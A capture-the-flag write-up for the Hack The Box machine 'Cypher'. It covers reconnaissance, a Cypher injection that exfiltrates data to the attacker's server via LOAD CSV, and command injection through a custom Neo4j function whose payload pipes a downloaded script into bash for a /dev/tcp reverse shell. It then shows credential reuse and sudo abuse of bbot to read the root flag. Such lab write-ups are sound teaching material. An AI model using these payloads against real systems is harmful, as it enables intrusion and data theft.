---
title: 'HTB Writeup - Cypher'
date: 2025-11-09 17:00:00 +0000
categories: [HTB Medium Machines]
tags: [Medium, Linux, HTB, Cypher Injection, BBOT, Java File]
---

<img src="/assets/img/cypher/image.png" alt="/assets/img/cypher/image.png">

Cypher is a medium HTB machine where we can perform a `cypher injection` to execute a `custom function` that we find inside a .jar file to get a foothold. From there, we find credentials that can be used to move laterally. Finally we abuse a multipurpose script to read the root flag.

# Reconnaissance
```bash
[t3mpx@parrot]─[~/htb/medium/cypher]
└──★$ nmap -np- -Pn -sVC --min-rate 5000 -oN nmap-scan.txt 10.10.11.57
Nmap scan report for 10.10.11.57
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  9 12:18:01 2025 -- 1 IP address (1 host up) scanned in 28.52 seconds
```
> SSH, HTTP

> Let’s add the domain to our /etc/hosts file: `echo -e '10.10.11.57\tcypher.htb' | sudo tee -a /etc/hosts`

Let's have a look at [http://cypher.htb](http://cypher.htb):
<img src="/assets/img/cypher/image2.png" alt="/assets/img/cypher/image2.png">

Fuzzing for directories reveals some interesting stuff:
```bash
[t3mpx@parrot]─[~/htb/medium/cypher]
└──★$ ffuf -u http://cypher.htb/FUZZ -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -ic -sa -mc all -fc 404
                                                                                                                                                            
        /'___\  /'___\           /'___\                    
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v2.1.0-dev
________________________________________________

<SNIP>

________________________________________________
                                                                              
                        [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 53ms]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 53ms]
about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 54ms]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 54ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 38ms]
                        [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 34ms]
:: Progress: [220546/220546] :: Job [1/1] :: 1123 req/sec :: Duration: [0:03:29] :: Errors: 0 ::
```
> login, api and testing seem interesting

Inside [http://cypher.htb/testing/](http://cypher.htb/testing/), we find a `.jar` application:
<img src="/assets/img/cypher/image3.png" alt="/assets/img/cypher/image3.png">

# Exploit
## Cypher Injection
Using a `'` inside the Username in the login panel at [http://cypher.htb/login](http://cypher.htb/login) seems to break the cypher query it's using:
 <img src="/assets/img/cypher/image4.png" alt="/assets/img/cypher/image4.png">

We can craft a cypher injection to test if it's actually working, this [page](https://pentester.land/blog/cypher-injection-cheatsheet/#example-out-of-band-injection) was of great help:
<img src="/assets/img/cypher/image5.png" alt="/assets/img/cypher/image5.png">
>`' RETURN 0 as hash UNION CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.20/?p=' + label AS r RETURN 0 as hash//`

> We're ending the original query and using the clause `UNION` to perform another query, in this case retrieving the labels.

We get a hit:
```bash
[t3mpx@parrot]─[~/htb/medium/cypher]
└──★$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.57 - - [09/May/2025 20:24:52] "GET /?p=USER HTTP/1.1" 200 -
10.10.11.57 - - [09/May/2025 20:24:52] "GET /?p=HASH HTTP/1.1" 200 -
10.10.11.57 - - [09/May/2025 20:24:52] "GET /?p=DNS_NAME HTTP/1.1" 200 -
10.10.11.57 - - [09/May/2025 20:24:52] "GET /?p=SHA1 HTTP/1.1" 200 -
10.10.11.57 - - [09/May/2025 20:24:52] "GET /?p=SCAN HTTP/1.1" 200 -
10.10.11.57 - - [09/May/2025 20:24:52] "GET /?p=ORG_STUB HTTP/1.1" 200 -
10.10.11.57 - - [09/May/2025 20:24:52] "GET /?p=IP_ADDRESS HTTP/1.1" 200 -
```

# Lateral Movement
## Shell as neo4j
### Java Application

Opening the java file using `jadx-gui` reveals that there is a custom function called `getUrlStatusCode` that is using `sh` to run `curl`.

```java
<SNIP>
/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions.class */
public class CustomFunctions {
    @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
    @Description("Returns the HTTP status code for the given URL as a string")
    public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
        if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
            url = "https://" + url;
        }
        String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
        System.out.println("Command: " + Arrays.toString(command));
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        StringBuilder errorOutput = new StringBuilder();
        while (true) {
            String line = errorReader.readLine();
            if (line == null) {
                break;
            }
            errorOutput.append(line).append("\n");
        }
        String statusCode = inputReader.readLine();
        System.out.println("Status code: " + statusCode);
<SNIP>
```

Let's rebuild our injection to receive a reverse shell back, first we set up everything needed:
```bash
echo -e "/bin/bash -i >& /dev/tcp/10.10.14.20/9001 0>&1" > shell.sh
```

```bash
sudo python3 -m http.server 80
```

Now we inject the new payload using the custom function:
```text
' RETURN 0 as hash UNION CALL custom.getUrlStatusCode('10.10.14.20; curl 10.10.14.20/shell.sh | bash') yield statusCode RETURN 0 as hash//"
```

```bash
[t3mpx@parrot]─[~/htb/medium/cypher]
└──★$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.57] 54666
bash: cannot set terminal process group (1447): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$
```

## Shell as graphasm

Inside the home folder of the user `graphasm` we find a file with credentials:
```bash
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml 
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```


Let's SSH in:
```bash
[t3mpx@parrot]─[~/htb/medium/cypher]
└──★$ ssh graphasm@cypher.htb
graphasm@cypher:~$
```

### User flag
```bash
graphasm@cypher:~$ cat user.txt
819fcbd957f92f7ecc891d0322fc1449
```

## Shell as root

The user `graphasm` is able to run the tool `bbot` as root:
```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

Looking at the help section of the tool, we come across the following:
```bash
Target:
  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]
                        Targets to seed the scan
```
> We can pass it a `.txt` to use as a target

### Root flag
```bash
graphasm@cypher:~$ sudo bbot /root/root.txt
<SNIP>
[TRCE] Caught exception in resolve_raw(74b6d3567439423b55869b075c458533, {}):
<SNIP>
```




